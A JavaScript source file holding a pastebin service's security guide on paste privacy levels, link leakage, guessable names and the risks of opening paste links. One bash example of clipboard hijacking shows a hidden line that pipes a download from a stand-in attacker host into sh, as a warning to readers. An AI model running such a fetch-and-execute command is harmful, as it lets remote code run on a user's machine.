// src/pages/guides/are-pastebins-safe.js
// Article body for /guides/are-pastebins-safe.
// Block keys and the renderer are documented in src/pages/Guide.jsx.

const arePastebinsSafe = [
    {
        blocks: [
            {
                p: '"Are pastebins safe?" is really two questions wearing one coat. Is it safe to **put** something in a paste, and is it safe to **open** a paste link somebody sent you? The answers are different, and the honest version of both is more useful than reassurance.',
            },
            {
                p: 'The short version: a paste link is a bearer token. Whoever holds it gets in. That is the whole security model, and once you understand it, everything else follows - including what "unlisted" does and does not buy you.',
            },
        ],
    },
    {
        h2: 'The four levels of "private", and what each one protects',
        blocks: [
            {
                table: {
                    caption: 'Most confusion about paste privacy is a mix-up between rows two and three.',
                    headers: ['Level', 'What it means', 'Protects against'],
                    rows: [
                        ['Public', 'Listed on a feed and open to search engines', 'Nothing. It is published'],
                        ['Unlisted', 'Not listed, not indexed, but readable by anyone with the URL', 'Being stumbled upon or found by search'],
                        ['Private', 'Requires a login or a password to read', 'People without the credential'],
                        ['Encrypted', 'The server itself cannot read it', 'The server, its host, and anyone who obtains the database'],
                    ],
                },
            },
            {
                p: 'BinPaste pastes are **unlisted by default** - row two. They stay off the [public feed](/public) unless you tick "Make Public", and every paste page is served with a `noindex` instruction so search engines leave it out of their results. There is no password option and no encryption, which puts rows three and four out of reach by design.',
            },
            {
                note: 'This is not BinPaste being lax; it is the trade-off that makes a pastebin useful. The moment a paste needs a login to read, the person you are trying to help needs an account, and you have lost the reason you used a paste in the first place.',
            },
        ],
    },
    {
        h2: 'How links leak, even when you are careful',
        blocks: [
            {
                p: 'If the URL is the key, it is worth knowing the ways a URL escapes:',
            },
            {
                ul: [
                    '**Forwarding.** The colleague you sent it to pastes it into a group chat to ask someone else. Entirely reasonable, completely out of your control.',
                    '**Chat and ticket history.** A link dropped in Slack, a Jira comment, or a support ticket is now searchable by everyone with access to that system, indefinitely.',
                    '**Browser history and sync.** On a shared machine, or a browser signed into a personal account on a work laptop, the URL travels.',
                    '**Screenshots.** People screenshot the whole browser window, address bar included, far more often than they mean to.',
                    '**Corporate proxies and security tooling.** Plenty of networks log full URLs, and some fetch them automatically to scan for threats.',
                    '**Link unfurling.** Chat platforms fetch a link to build a preview card. That is a robot reading your paste seconds after you post it.',
                    '**Guessing.** More on this next, because it is the one people dismiss.',
                ],
            },
        ],
    },
    {
        h2: 'Can somebody guess my paste URL?',
        blocks: [
            {
                p: 'Yes - and this is the honest cost of the feature BinPaste is built around. Custom names are excellent for links you want to remember and type. They are, for the same reason, guessable.',
            },
            {
                table: {
                    headers: ['Paste name', 'Realistically'],
                    rows: [
                        ['`test`, `notes`, `abc`, `hello`', 'Someone has already tried these. Assume they are readable by anyone'],
                        ['`meeting-notes`, `todo`, `passwords`', 'Trivially guessable, and `passwords` is actively probed'],
                        ['`acme-billing-refactor`', 'Not guessable at random, but discoverable by anyone who knows your company and project'],
                        ['`kQmZxRtVbn` (generated)', 'Not guessable in practice'],
                    ],
                },
            },
            {
                p: 'So the rule is simple: **pick a memorable name when the content is unremarkable, and use the generate button when it is not.** BinPaste has a one-click generator that produces a random letter string, and that is what it is for. A named link is a convenience feature, not a privacy feature.',
            },
            {
                p: 'Worth knowing too: automated scanners crawl paste sites specifically, looking for credential patterns. They do not need a search engine and they do not need your link - some simply try candidate URLs at volume. That is why "it was unlisted" is no comfort at all when the thing you pasted was an API key.',
            },
        ],
    },
    {
        h2: 'Is it safe to open a paste link someone sends me?',
        blocks: [
            {
                p: 'Usually, with two real caveats. A paste page shows text; the text itself cannot execute on your machine. The risks are not the page - they are what you do with what is on it.',
            },
            {
                h3: 'Caveat one: it is a delivery mechanism for links',
            },
            {
                p: 'Paste sites have long been used to host the middle step of a phishing chain, because the domain looks harmless and the content can be changed or removed quickly. Treat a link inside a paste exactly as you would a link in an email from a stranger.',
            },
            {
                h3: 'Caveat two: never paste a command straight into a terminal',
            },
            {
                p: 'This is the one that gets technical people. Any web page can put something on your clipboard that differs from what is displayed on screen, and a hidden trailing newline makes a shell run the command the instant it is pasted - before you have read it.',
            },
            {
                code: {
                    lang: 'bash',
                    text: '# What the page appears to show:\nsudo apt install some-tool\n\n# What can actually land on your clipboard - the second line hidden,\n# and a trailing newline so your shell runs both without asking:\nsudo apt install some-tool\ncurl -s http://attacker.example/x | sh',
                },
            },
            {
                p: 'The defence costs nothing and works every time: **paste into a text editor first, read it, then paste it into the terminal.** Do this with commands from paste sites, blog posts, Stack Overflow answers, and vendor documentation alike. It is not paranoia about pastebins; it is a habit for copied shell commands generally.',
            },
        ],
    },
    {
        h2: 'What BinPaste actually does',
        blocks: [
            {
                p: 'So you can judge it rather than trust it:',
            },
            {
                table: {
                    headers: ['Behaviour', 'Detail'],
                    rows: [
                        ['Unlisted by default', 'Nothing reaches the public feed unless you tick "Make Public"'],
                        ['No search indexing of pastes', 'Every paste page is served with a `noindex` instruction'],
                        ['No ads on paste pages', 'The ad script is stripped from paste pages, so ads never sit next to your text'],
                        ['Expiry', '10 minutes, 1 hour, 1 day, 1 week, 1 month, or never'],
                        ['No accounts', 'Nothing to log into, and therefore no password of yours to breach'],
                        ['Removal on request', 'A Report button on every paste, plus email - see [Contact](/contact)'],
                        ['No encryption', 'Stored as text in a Firebase database; the operator can read it'],
                        ['No password protection', 'Anyone with the link can read it'],
                        ['No editing', 'A paste cannot be changed after creation, only deleted'],
                    ],
                },
            },
            {
                p: 'The last three are limits, stated plainly because you should not have to discover them later. What is stored, how long, and who processes it is set out in full in the [Privacy Policy](/privacy).',
            },
        ],
    },
    {
        h2: 'So when is a pastebin the wrong tool?',
        blocks: [
            {
                p: 'Whenever the answer to "what if a stranger read this?" is anything worse than mild embarrassment. Concretely: credentials, private keys, customer data, medical or financial records, or anything under NDA. The full list, with what to use instead, is in [8 things you should never paste into a pastebin](/guides/things-never-to-paste).',
            },
            {
                p: 'For a genuine secret, use a one-time secret sharer that destroys the content after a single read, or your team’s password manager. Those tools exist precisely because a pastebin cannot do that job.',
            },
        ],
    },
    {
        h2: 'How to reduce your exposure in practice',
        blocks: [
            {
                ol: [
                    'Redact before pasting, never after. Deleting a paste does not retrieve the copies - see [how to share a config file safely](/guides/share-config-file-safely).',
                    'Use the generated random name for anything you would rather not be stumbled upon.',
                    'Set the shortest expiry that still gets you the help you need.',
                    'Leave "Make Public" unticked unless you actively want the paste on the feed.',
                    'Send the link to one person or one channel, not several.',
                    'Delete it when you are done. Use the Report button on the paste, or email the link.',
                    'If you ever paste a live credential: rotate it first, then get the paste removed. In that order.',
                ],
            },
            {
                cta: {
                    text: 'Sharing something ordinary - a snippet, a log, a redacted config? Name it or generate a random link, set an expiry, and go.',
                    label: 'Create a paste',
                    to: '/',
                },
            },
            {
                p: 'Used within those lines, a pastebin is one of the safest tools in the stack: no account, no install, no plugin, no file to scan, and nothing left behind once the expiry passes. The danger was never the pastebin. It was treating an unlisted URL as a locked door.',
            },
        ],
    },
];

export default arePastebinsSafe;
